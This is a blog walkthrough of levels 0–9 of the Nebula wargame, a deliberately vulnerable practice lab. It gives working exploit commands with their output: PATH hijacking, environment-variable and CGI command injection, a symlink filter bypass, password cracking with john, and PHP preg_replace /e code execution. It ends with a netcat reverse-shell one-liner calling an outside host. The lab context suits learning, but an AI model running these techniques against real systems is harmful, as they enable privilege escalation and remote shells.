Title: Nebula Wargame walkthrough Level 0-9
Date: 2015-09-28 23:52
Author: Nikolai Tschacher
Category: Wargames
Tags: Linux, Programming, Security, Problem Solving
Slug: nebula-wargame-walkthrough-level-0-9
Status: Published

In this blog post we will walk through the solutions of the levels 0 to 9 of the *Nebula* wargame, which is
hosted on <http://exploit-exercises.com>. This writeup will force me to memorize commands better and exercise a bit. I fear that this writeup is of
no use for other people, since you hopefully want to solve those exercises on your own :)

### Level 0 - Finding setuid programs in the filesystem

As the descriptions states you need to find a setuid binary that gets a shell for the *flag00* user.
We can find setuid executables with a command such as the following:

`find / -type f -perm -4000 -user flag00 2>/dev/null`

This command suppresses error messages (The `2>/dev/null` part redirects error output to /dev/null). 
Furthermore the `-perm -4000` flag is responsible for 

	:::text -perm -mode
	All  of  the  permission bits mode are set for the file.  Symbolic modes are accepted in this form, and this is usually the way in which would want to use
	them.  You must specify `u', `g' or `o' if you use a symbolic mode.   See the EXAMPLES section for some illustrative examples.

Now execute the found binary and run `getflag` and you should be done.

## Level 1 - Exploiting PATH vulnerabilities

This level is also really easy. We need to trick the following code to run the program `getflag` with id `flag01`:

	:::c
	include <stdlib.h>
	include <unistd.h>
	include <string.h>
	include <sys/types.h>
	include <stdio.h>

	int main(int argc, char **argv, char **envp) {
		gid_t gid;
		uid_t uid;
		gid = getegid();
		uid = geteuid();

		setresgid(gid, gid, gid);
		setresuid(uid, uid, uid);

		system("/usr/bin/env echo and now what?");
	}

As we all now `/usr/bin/env` executes a program with the current environment. And the environment includes the 
`$PATH` variable that specifies where programs can be found, such that users don't need to execute the whole path.

Of course we can set the PATH variable to some folder and include a program there which is called `echo`.

	:::bash
	mkdir /tmp/bin
	echo -e '#!/bin/bash\necho "executing with id $(id)";\ngetflag' > /tmp/bin/echo && chmod +x /tmp/bin/echo
	PATH=/tmp/bin/:$PATH

	level01@nebula:/home/flag01$ ./flag01 
	executing with id uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
	You have successfully executed getflag on a target account


## Level 2 - Command Injection in setuid C programs

Level 2 is very easy. The vulnerability is a basic command injection flag. When you see the following lines
in the code:

	:::c
	buffer = NULL;

	asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
	printf("about to call system(\"%s\")\n", buffer);
	
	system(buffer);

it becomes clear how to call `getflag` on the target account:

	:::bash
	level02@nebula:/home/flag02$ USER='; getflag; echo'
	level02@nebula:/home/flag02$ ./flag02 
	about to call system("/bin/echo ; getflag; echo is cool")

	You have successfully executed getflag on a target account
	is cool

I just ended the current command with `;` and appended our own command and 
closed it again with the original `echo` statement.


## Level 3 - Exploiting cronjobs

**NOT SOLVED YET**

In Level 3 we can write in the home directory and create our own executable scripts.
These are executed with a cronjob script that looks like this:

	:::bash
	#!/bin/sh

	for i in /home/flag03/writable.d/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done


We need to consider the `ulimit -t5` call that sets a user limit:

The `bash -x` will  I simply created a small script in `writeable.d` and added a file `test.sh` with the following 
contents:

	:::bash
	getflag

## Level 4 - Bypassing filters with symlinks

This level requires us to read a file token in the `/home/flag04` directory which we cannot access.
But there is a setuid binary that runs with euid flag04 with the following code:

	:::C
	#include <stdlib.h>
	#include <unistd.h>
	#include <string.h>
	#include <sys/types.h>
	#include <stdio.h>
	#include <fcntl.h>

	int main(int argc, char **argv, char **envp)
	{
	  char buf[1024];
	  int fd, rc;

	  if(argc == 1) {
	    printf("%s [file to read]\n", argv[0]);
	    exit(EXIT_FAILURE);
	  }

	  if(strstr(argv[1], "token") != NULL) {
	    printf("You may not access '%s'\n", argv[1]);
	    exit(EXIT_FAILURE);
	  }

	  fd = open(argv[1], O_RDONLY);
	  if(fd == -1) {
	    err(EXIT_FAILURE, "Unable to open %s", argv[1]);
	  }

	  rc = read(fd, buf, sizeof(buf));
	  
	  if(rc == -1) {
	    err(EXIT_FAILURE, "Unable to read fd %d", fd);
	  }

	  write(1, buf, rc);
	}

To bypass it, we simple create a symbolic link to the token file. 
The `read()` function apparently resolves symbolic links: 

	:::bash
	level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/bla
	level04@nebula:/home/flag04$ ./flag04 /tmp/bla 
	06508b5e-8909-4f38-b630-fdb148a848a2
	level04@nebula:/home/flag04$ su flag04
	Password: 
	sh-4.2$ getflag
	You have successfully executed getflag on a target account


## Level 5 - Reading sensitive backup files to exploit accounts

When you change to the directory of `flag05` you can immediately see a suspicious directory named
`.backup`. There you'll find a `tar.gz` file. When you decompress and untar it, you'll see that
it contains the credentials for a ssh connection. After some tries, you'll see that you may
login to the flag05 account with the private key (contained in `.ssh/id_rsa`).


	:::bash
	# This command creates a temporary directory and unpacks the .tgz file there. Then it logs in with the
	# id_rsa key which was in the compressed tar archive.
	TEMPDIR=$(mktemp -d) && tar -xzvf .backup/backup-19072011.tgz -C $TEMPDIR && ssh -i $TEMPDIR/.ssh/id_rsa flag05@localhost 'getflag'


## Level 6 - Cracking crypt(3)

This one is fairly easy. As the level description states:

> The flag06 account credentials came from a legacy unix system. 

This just means that the hashed passwords are still stored in `/etc/passwd` and that they are hashed with 
`crypt(3)`.

So I installed a password cracking program named *john* and downloaded the `/etc/passwd` file from nebula to my
host machine. 

	:::bash
	scp level06@nebula:/etc/passwd passwd 

Then I called john with the password file which yielded the password immediately:

	:::bash
	nikolai@nikolai:~/Projects/private/wargames/exploit-exercises/nebula$ john passwd 
	Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
	Press 'q' or Ctrl-C to abort, almost any other key for status
	hello            (flag06)
	1g 0:00:00:00 100% 2/3 11.11g/s 8366p/s 8366c/s 8366C/s 123456..marley
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed

Well the password is **hello** :)

	:::bash
	# enter the password 'hello'
	ssh flag06@nebula 'getflag'
	flag06@nebula's password: 
	You have successfully executed getflag on a target account

## Level 7 - RCE exploit in cgi files

This one is quite easy. You can immediately see that there is a **cgi perl** script in the `flag07` directory
that exposes ping.

	:::perl
	#!/usr/bin/perl

	use CGI qw{param};

	print "Content-type: text/html\n\n";

	sub ping {
		$host = $_[0];

		print("<html><head><title>Ping results</title></head><body><pre>");

		@output = `ping -c 3 $host 2>&1`;
		foreach $line (@output) { print "$line"; } 

		print("</pre></body></html>");
		
	}

	# check if Host set. if not, display normal page, etc

	ping(param("Host"));


Then you can access the cgi bin over a browser and simply inject some command into
the script. You need to inspect `thttpd.conf` config file for the httpd to see on which port the 
web server is listeingn (7007).
Then I did the following:

	:::bash
	http://192.168.56.101:7007/index.cgi?Host=$(getflag > /tmp/getflag)

and then you can see that getflag was executed when you open it with level07:

	:::bash
	level07@nebula:/home/flag07$ cat /tmp/getflag 
	You have successfully executed getflag on a target account


## Level 8 - Reading and understanding pcap files!


This level was quite tricky and a lot of fun to solve. You can find a file named `capture.pcap` in 
the `flag08` directory. Download it to your host (with scp for instance) and open the pcap file with wireshark:

	:::bash
	wireshark -r capture.pcap

Then right click on a packet and select *Follow TCP Stream*. You will see something like the following:

![wireshark screenshot]({static}/images/nebula_level08.png) 

We can see that we captured the network streams of someone trying to loging in with username *level08* and 
a password with some special chars in it: `0x7f`. A quick lookup in a ascii table confirms that the ascii code
at 0x7f is a control code for the *DEL(delete)* character. So the overall password is: **backd00Rmate**

Then you can login to flag08 with this password and execute `getflag`.


## Level 9 - The evil `/e` in PHP regular expressions: e(PREG_REPLACE_EVAL)

We have a PHP script that is probably executed by the `flag09` binary in `/home/flag09`.

The script contains the following code:

	:::php
	<?php

	function spam($email)
	{
		$email = preg_replace("/\./", " dot ", $email);
		$email = preg_replace("/@/", " AT ", $email);
		
		return $email;
	}

	function markup($filename, $use_me)
	{
		$contents = file_get_contents($filename);

		$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
		$contents = preg_replace("/\[/", "<", $contents);
		$contents = preg_replace("/\]/", ">", $contents);

		return $contents;
	}

	$output = markup($argv[1], $argv[2]);

	print $output;

	?>

This was also a very nice level. And the code has even a variable named `$use_me` that helps in 
exploiting the bug. 

To exploit it, I created a file named `/tmp/testfile` with the below contents. Then I proceeded to call the setuid binary:

	:::bash
	level09@nebula:/home/flag09$ cat /tmp/testfile 
	[email {${eval(system($use_me))}}]

	level09@nebula:/home/flag09$ ./flag09 /tmp/testfile 'getflag > /tmp/flagged'
	PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1

	level09@nebula:/home/flag09$ cat /tmp/flagged 
	You have successfully executed getflag on a target account

How it works: First for the basic understanding read <http://php.net/manual/en/reference.pcre.pattern.modifiers.php>.

After having read it, we know that every matched group in the pattern in `preg_replace()` is called with the spam function.
But we control what parameter is passed to `spam()` with the reference `\2`.

So we can just call a bash command through php with a function like `system()`. There we make use of the second parameter `$use_me`.

For a POC, I just redirected the
contents of `getflag` to the file `/tmp/flagged`. But of course we could execute any command, like opening a backdoor shell with
a `$use_me` parameter like: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
